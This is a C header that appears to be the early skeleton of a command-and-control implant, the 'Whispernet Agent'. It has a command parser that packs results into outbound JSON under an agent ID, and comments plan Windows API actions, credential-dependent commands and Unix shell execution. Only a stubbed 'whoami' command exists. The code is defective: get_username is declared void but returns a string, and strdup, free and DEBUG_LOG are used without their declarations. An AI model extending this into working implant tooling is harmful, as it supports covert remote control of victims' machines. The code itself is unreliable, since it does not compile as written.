#pragma once
#include <stdio.h>
#include "whisper_json.h"

/*
    Baked in commands to Whispernet Agent

    uses things like whisper_winapi to do actions here


    may need to split into .c and .h as well
*/
//void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);

void get_username(OutboundJsonDataStruct* response_struct);
void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);

// ====================
// Functions
// ====================

void set_response_data(OutboundJsonDataStruct* response_struct, const char* data) {
    if (response_struct->command_result_data) {
        free(response_struct->command_result_data);
    }
    
    response_struct->command_result_data = strdup(data); // _strdup dynamically allocates and copies the string
    if (!response_struct->command_result_data) {
        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
    }
}

// later - have a seperate parse tree based on if creds are supplied or not, or
// somethign like that...

int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct) {
    if (!response_struct) {
        DEBUG_LOG("[!] response_struct is NULL!\n");
        return -1;
    }

    DEBUG_LOG("Struct UUID: %s\n", response_struct->agent_id);
    DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);

    if (strcmp(command, "whoami") == 0) {
        DEBUG_LOG("[COMMAND] whoami\n");
        get_username(response_struct);
    }  else {
        DEBUG_LOG("[COMMAND] Unknown command!\n");
        set_response_data(response_struct, "Unknown command");
    }
    return 0;
}

// For unix - literally just an os.system or whatever is fine for now, can make scripts around it

void get_username(OutboundJsonDataStruct* response_struct){
    return "FAKEUSERNAME";
}